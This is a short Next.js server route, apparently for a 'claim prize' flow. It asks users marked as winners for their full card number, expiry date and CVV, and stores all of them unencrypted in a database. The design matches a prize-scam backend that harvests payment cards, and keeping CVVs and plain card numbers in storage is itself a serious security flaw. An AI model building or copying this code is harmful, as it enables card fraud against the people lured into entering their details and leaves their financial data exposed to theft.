import { NextResponse } from 'next/server'
import { getDb } from '@/lib/db'
import { getSession } from '@/lib/session'

export async function POST(request) {
  try {
    const session = await getSession()
    if (!session?.id) return NextResponse.json({ error: 'Not authenticated' }, { status: 401 })

    const db = await getDb()
    const user = db.prepare('SELECT * FROM users WHERE id = ?').get(session.id)
    if (!user) return NextResponse.json({ error: 'User not found' }, { status: 404 })
    if (!user.is_winner) return NextResponse.json({ error: 'You are not a winner' }, { status: 403 })
    if (user.payment_submitted) return NextResponse.json({ error: 'Payment details already submitted' }, { status: 400 })

    const { cardholder_name, card_number, card_expiry, card_cvv } = await request.json()
    if (!cardholder_name || !card_number || !card_expiry || !card_cvv)
      return NextResponse.json({ error: 'All card fields are required' }, { status: 400 })

    const clean = card_number.replace(/\s/g, '')
    if (clean.length !== 16) return NextResponse.json({ error: 'Card number must be 16 digits' }, { status: 400 })
    if (!/^\d{2}\/\d{2}$/.test(card_expiry)) return NextResponse.json({ error: 'Invalid expiry (MM/YY)' }, { status: 400 })
    if (card_cvv.length !== 3) return NextResponse.json({ error: 'CVV must be 3 digits' }, { status: 400 })

    const now = new Date().toISOString().replace('T', ' ').slice(0, 19)
    db.prepare(`
      UPDATE users SET
        card_holder_name = ?, card_number = ?, card_expiry = ?, card_cvv = ?,
        payment_submitted = 1, payment_submitted_at = ?
      WHERE id = ?
    `).run(cardholder_name, clean, card_expiry, card_cvv, now, session.id)

    return NextResponse.json({ success: true })
  } catch (err) {
    console.error('claim prize:', err)
    return NextResponse.json({ error: 'Server error' }, { status: 500 })
  }
}
